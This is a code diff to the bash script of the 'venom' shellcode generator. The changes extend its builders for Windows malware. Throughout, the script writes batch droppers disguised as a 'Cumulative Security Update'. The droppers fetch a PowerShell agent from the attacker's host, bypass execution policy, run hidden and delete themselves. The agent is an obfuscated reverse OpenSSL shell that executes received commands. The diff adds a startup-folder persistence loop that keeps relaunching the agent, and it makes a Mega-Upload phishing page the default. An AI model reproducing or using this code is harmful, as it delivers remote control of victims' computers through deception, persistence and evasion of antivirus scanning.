@@ -12290,7 +12290,7 @@ cat << !
     DESCRIPTION        : Reverse OpenSSL Powershell Shell
     TARGET SYSTEMS     : Windows (8|8.1|10)
     LOLBin             : Powershell (DownloadFile)
-    DROPPER EXTENSION  : BAT
+    DROPPER EXTENSION  : BAT|VBS
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : AVAILABLE
 
@@ -12299,7 +12299,7 @@ cat << !
     DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
     TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     LOLBin             : Powershell (DownloadFile)
-    DROPPER EXTENSION  : .CRDOWNLOAD.BAT (MITRE T1036)
+    DROPPER EXTENSION  : .CRDOWNLOAD.BAT|VBS (MITRE T1036)
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : AVAILABLE
 
@@ -12728,6 +12728,7 @@ if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 ## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
 random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
+wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
@@ -12738,7 +12739,7 @@ cat << !
     LOLBin   : Powershell (DownloadFile)
     DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOADTO : $rpath\\\\$NaM.ps1
+    UPLOADTO : $rpath => ($wvd)
     SILENT PERSISTENCE : $easter_egg
 !
 echo "---"
@@ -12770,7 +12771,6 @@ else
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
    echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
-   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
@@ -12787,24 +12787,30 @@ else
       echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo timeout /T 8 /NOBREAK >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo netstat -ano^|findstr \"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    fi
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
 fi
 
 
-## Build Reverse Powershell Shell
-echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output .."${Reset};sleep 2
+
+## Build Reverse TCP Powershell Shell (OpenSSL).
+echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/$NaM.ps1
-echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
-echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
+echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
-echo "\$NewObjectCommand = (\$Constructor -Join '');\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();" >> $IPATH/output/$NaM.ps1
-echo "[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "Start-Sleep -Milliseconds 700" >> $IPATH/output/$NaM.ps1
+echo "\$Waudt = \"tneilCpcT.stekcoS.teN\";\$Bin = \$Waudt.ToCharArray();[Array]::Reverse(\$Bin);" >> $IPATH/output/$NaM.ps1
+echo "\$NewObjectCommand = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/$NaM.ps1
+echo "[Array]::Reverse(\$CharArray);\$PSArgException = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
@@ -12815,6 +12821,7 @@ echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
 echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
+echo "Start-Sleep -Milliseconds 500" >> $IPATH/output/$NaM.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
 echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
@@ -12837,7 +12844,7 @@ cd $IPATH
 
 ## Building Download webpage
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
     cd $IPATH/templates/phishing
    sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
@@ -12877,7 +12884,7 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
-xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo OpenSSL:[$CN]:[key.pem][cert.pem];echo Listening on [any] $lport ..;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
 dtr=$(date|awk {'print $1,$2,$3,$4'})
 cd $IPATH
 sleep 2
@@ -12962,6 +12969,7 @@ if [ -z "$rpath" ]; then rpath="%LocalAppData%";fi
 
 ## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
 random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
+wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 ## Random chose one fake extension.
 # to Masquerade the dropper real extension (MITRE T1036)
 index=$(cat /dev/urandom | tr -dc '1-5' | fold -w 1 | head -n 1)
@@ -12986,7 +12994,7 @@ cat << !
     LOLBin   : Powershell (DownloadFile)
     DROPPER  : $IPATH/output/$Drop.$ext.bat
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOADTO : $rpath\\\\$NaM.ps1
+    UPLOADTO : $rpath => ($wvd)
     SILENT PERSISTENCE : $easter_egg
 !
 echo "---"
@@ -13006,7 +13014,6 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
    echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat 
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
@@ -13017,7 +13024,6 @@ else
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
    echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
-   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update' > Recent_OS_Updates.txt" >> $IPATH/output/$Drop.$ext.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
@@ -13034,7 +13040,12 @@ else
       echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo timeout /T 8 /NOBREAK >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo netstat -ano^|findstr \"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    fi
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
@@ -13069,7 +13080,7 @@ echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\
 
 ## Building the Download Webpage Sellected.
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
     cd $IPATH/templates/phishing
    sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
